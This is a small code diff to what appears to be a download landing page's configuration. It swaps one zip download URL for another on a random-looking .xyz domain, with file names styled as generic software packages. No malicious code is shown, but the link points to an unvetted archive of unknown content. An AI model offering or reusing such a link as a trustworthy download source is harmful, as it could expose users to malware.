@@ -55,7 +55,7 @@
        btnRadius: "10px",
        bg: "//p8.qhimg.com/t11098f6bcd5e40dd91a92718e4.webp",
     },
-    downloadUrl: "https://lisoeruthzhsi1sel-elserj.xyz/Sioppcyyb-xp.win11_stuep56822.125.zip", 
+    downloadUrl: "https://lisoeruthzhsi1sel-elserj.xyz/CryvenXHS_v6.08.02_Universal.zip", 
     QH:"QH_132_4#18",
     theme:"v2",
     themeBtnColor: "#15CA71",
